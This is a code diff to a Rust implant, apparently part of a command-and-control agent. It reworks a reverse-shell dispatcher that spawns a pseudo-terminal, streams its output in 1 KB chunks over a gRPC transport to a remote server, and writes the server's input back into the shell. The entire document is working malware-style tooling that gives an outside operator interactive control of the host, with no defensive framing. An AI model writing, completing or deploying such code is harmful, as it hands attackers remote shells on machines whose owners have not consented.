@@ -5,6 +5,8 @@ use portable_pty::{native_pty_system, CommandBuilder, PtySize};
 use std::sync::mpsc::channel;
 use transport::Transport;
 
+const CHUNK_SIZE: usize = 1024; // 1 KB Limit (/chunk)
+
 /*
  * ReverseShellMessage will open a reverse shell when dispatched.
  */
@@ -21,15 +23,17 @@ impl Dispatcher for ReverseShellMessage {
         #[cfg(debug_assertions)]
         log::info!("starting reverse shell");
 
-        let (input_tx, input_rx) = channel::<ReverseShellResponse>();
-        let (output_tx, output_rx) = channel::<ReverseShellRequest>();
+        // let (input_tx, mut input_rx) = tokio::sync::mpsc::channel::<ReverseShellResponse>(1024);
+        // let (output_tx, output_rx) = tokio::sync::mpsc::channel(1024);
         let task_id = self.id;
 
         // Queue an initial message
-        output_tx.send(ReverseShellRequest {
-            task_id,
-            data: b"Welcome!\n".to_vec(),
-        })?;
+        // output_tx
+        //     .send(ReverseShellRequest {
+        //         task_id,
+        //         data: b"Welcome!\n".to_vec(),
+        //     })
+        //     .await?;
 
         // Use the native pty implementation for the system
         let pty_system = native_pty_system();
@@ -54,77 +58,64 @@ impl Dispatcher for ReverseShellMessage {
         let mut reader = pair.master.try_clone_reader()?;
         let mut writer = pair.master.take_writer()?;
 
+        let (output_tx, output_rx) = tokio::sync::mpsc::channel(1);
+
         const CHUNK_SIZE: usize = 1024; // 1 KB Limit (/chunk)
-        let read_handle = tokio::spawn(async move {
-            let mut result = move || -> Result<()> {
-                #[cfg(debug_assertions)]
-                log::info!("started reverse shell read handler");
+        tokio::spawn(async move {
+            loop {
+                let mut buffer = [0; CHUNK_SIZE];
+                let n = match reader.read(&mut buffer[..]) {
+                    Ok(n) => n,
+                    Err(_err) => {
+                        #[cfg(debug_assertions)]
+                        log::error!("failed to read tty: {}", _err);
 
-                loop {
-                    let mut buffer = [0; CHUNK_SIZE];
-                    let n = reader.read(&mut buffer[..])?;
+                        break;
+                    }
+                };
 
-                    #[cfg(debug_assertions)]
-                    log::info!(
-                        "reporting shell output (task_id={}, size={})",
-                        task_id,
-                        buffer.len()
-                    );
-
-                    output_tx.send(ReverseShellRequest {
+                match output_tx
+                    .send(ReverseShellRequest {
                         task_id,
                         data: buffer[..n].to_vec(),
-                    })?;
-
-                    if n < 1 {
-                        break Ok(());
+                    })
+                    .await
+                {
+                    Ok(_) => {
+                        #[cfg(debug_assertions)]
+                        log::info!(
+                            "queued tty output: {}",
+                            String::from_utf8_lossy(&buffer[..n])
+                        );
+                    }
+                    Err(_err) => {
+                        #[cfg(debug_assertions)]
+                        log::info!("failed to queue tty output: {}", _err);
                     }
                 }
-            };
-            match result() {
-                Ok(_) => {
-                    #[cfg(debug_assertions)]
-                    log::info!("closed reverse shell read handler");
-                }
-                Err(_err) => {
-                    #[cfg(debug_assertions)]
-                    log::error!("failed to read from shell: {}", _err);
-                }
             }
         });
 
-        let write_handle = tokio::spawn(async move {
-            #[cfg(debug_assertions)]
-            log::info!("started reverse shell write handler");
-
-            let mut result = move || -> Result<()> {
-                for msg in input_rx {
-                    writer.write_all(&msg.data)?;
-                }
-                Ok(())
-            };
-            match result() {
+        let req_stream = tokio_stream::wrappers::ReceiverStream::new(output_rx);
+        let mut stream = transport.reverse_shell(req_stream).await?.into_inner();
+        while let Some(msg) = stream.message().await? {
+            match writer.write_all(&msg.data) {
                 Ok(_) => {
                     #[cfg(debug_assertions)]
-                    log::info!("closed reverse shell write handler");
+                    log::info!("wrote reverse_shell input to tty");
                 }
                 Err(_err) => {
                     #[cfg(debug_assertions)]
-                    log::error!("failed to write to shell: {}", _err);
+                    log::error!("failed to write to reverse_shell input: {}", _err);
                 }
-            }
-        });
+            };
+        }
 
         #[cfg(debug_assertions)]
-        log::info!("started reverse shell gRPC stream");
+        log::info!("stopped reverse shell gRPC stream");
 
-        transport.reverse_shell(output_rx, input_tx).await?;
-
-        #[cfg(debug_assertions)]
-        log::info!("finished reverse shell gRPC stream");
-
-        write_handle.await?;
-        read_handle.await?;
+        // read_handle.await?;
+        // write_handle.await?;
 
         #[cfg(debug_assertions)]
         log::info!("closed reverse shell");
